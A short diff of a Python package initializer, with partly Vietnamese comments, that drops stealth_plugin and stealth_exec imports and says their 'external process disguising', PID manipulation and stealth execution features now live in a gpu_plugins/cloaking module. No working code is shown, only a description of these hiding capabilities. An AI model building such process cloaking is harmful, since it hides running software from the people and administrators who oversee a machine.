@@ -6,26 +6,15 @@ Plugin system cho **[External Process Disguising]** (giả trang tiến trình b
 và advanced stealth execution capabilities.
 
 ⚠️ COMPONENTS:
-- **stealth_plugin.py**: External process disguise plugin
-- **stealth_exec.py**: Advanced stealth execution engine
+- **Removed**: stealth_plugin.py và stealth_exec.py - functionality consolidated vào gpu_plugins/cloaking/
 
 ✅ FEATURES:
-- External PID manipulation
-- Advanced process disguising
-- Stealth execution coordination
-- Safe disguise risk assessment
-- Integration với self-stealth system
+- External PID manipulation (via gpu_plugins/cloaking/)
+- Advanced process disguising (via gpu_plugins/cloaking/)
+- Stealth execution coordination (via gpu_plugins/cloaking/)
+- Safe disguise risk assessment (via gpu_plugins/cloaking/)
+- Integration với gpu_plugins/cloaking/ system
 """
 
-# Plugin components
-try:
-    from .stealth_plugin import *
-except ImportError:
-    pass
-
-try:
-    from .stealth_exec import *
-except ImportError:
-    pass
-
-__all__ = []  # Plugins export their own components
+# Plugin components removed - functionality consolidated into gpu_plugins/cloaking/
+__all__ = []  # No plugins to export
